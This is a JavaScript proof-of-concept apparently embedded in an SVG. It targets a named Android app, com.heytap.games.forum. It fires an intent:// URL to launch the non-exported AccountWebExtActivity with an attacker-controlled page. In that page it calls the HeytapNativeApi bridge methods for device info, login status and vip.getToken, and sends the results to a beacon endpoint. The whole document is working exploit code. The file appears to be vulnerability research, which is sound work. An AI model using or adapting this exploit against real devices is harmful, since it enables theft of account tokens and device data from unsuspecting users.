svg.script:
/* 目的：验证 WebExt 容器（AccountWebExtActivity，exported=false）能否被攻击者页面用
   字符串 extra `key_web_url` 拉起，并在其中调用 WebExt 桥（common.* 无域分门禁 vs vip.* 需 score） */
var lines = [], MAX = 18;
function paint(){ for (var i=0;i<MAX;i++){ var e=document.getElementById('l'+(i+1)); if(e) e.textContent = lines[i]||''; } }
function put(s){ if (lines.length>=MAX) lines.shift(); lines.push(s); paint(); }
function beacon(k,v){ try{ new Image().src='http://127.0.0.1:8899/beacon?k='+encodeURIComponent('webext.'+k)
  +'&v='+encodeURIComponent(String(v).slice(0,400))+'&r='+Math.random(); }catch(e){} }
function log(k,v){ put(k+' = '+String(v).slice(0,95)); beacon(k,v); }
function promptCall(m,a){ try{ return String(prompt(JSON.stringify({method:m,args:a||{}}))); }catch(e){ return 'ERR:'+e; } }

var stage = (location.search.indexOf('stage=B')>=0) ? 'B' : 'A';
log('href', location.href);
log('stage', stage);

if (stage === 'A') {
  setTimeout(function(){
    log('appJsBridge', typeof window.appJsBridge);
    var self = location.href.split('#')[0].split('?')[0];
    var it = 'intent://launch#Intent;component=com.heytap.games.forum/'
      + 'com.platform.usercenter.ac.webview.ui.AccountWebExtActivity;'
      + 'S.key_web_url=' + self + '?stage=B&v=' + Date.now() + ';end';
    log('firing intent ->', 'AccountWebExtActivity (exported=false)');
    try { location.href = it; } catch(e){ log('intent_ERR', e); }
  }, 800);
} else {
  setTimeout(function(){
    // native→JS 回调对象由页面自己定义（x.java:357 调 window.HeytapJsApi.callback）
    window.HeytapJsApi = {
      callback: function(id, obj){ log('cb:' + id, JSON.stringify(obj)); },
      broadcastReceiver: function(name, obj){ log('bc:' + name, JSON.stringify(obj)); }
    };
    var api = window.HeytapNativeApi;   // addJavascriptInterface 注册名（w5/a.java:266）
    log('typeof HeytapNativeApi', typeof api);
    try { log('props', Object.getOwnPropertyNames(api).join(',')); } catch(e){ log('props_ERR', e); }
    var calls = [
      ['common.sdk_version', {}],
      ['common.device_info', {}],
      ['common.app_info', {}],
      ['common.network_state', {}],
      ['common.system_setting', {action: 'android.settings.APPLICATION_DETAILS_SETTINGS', package_name: 'com.android.settings'}],
      ['vip.isLogin', {}],
      ['vip.getToken', {}],
      ['vip.launchActivity', {}]
    ];
    calls.forEach(function(c){
      var id = 'c_' + c[0].replace(/\./g, '_');
      try {
        var r = api && api.invoke ? String(api.invoke(c[0], JSON.stringify(c[1]), id)) : 'NO_invoke';
        log(c[0], r);
      } catch(e){ log(c[0]+'_ERR', e); }
    });
  }, 900);
}
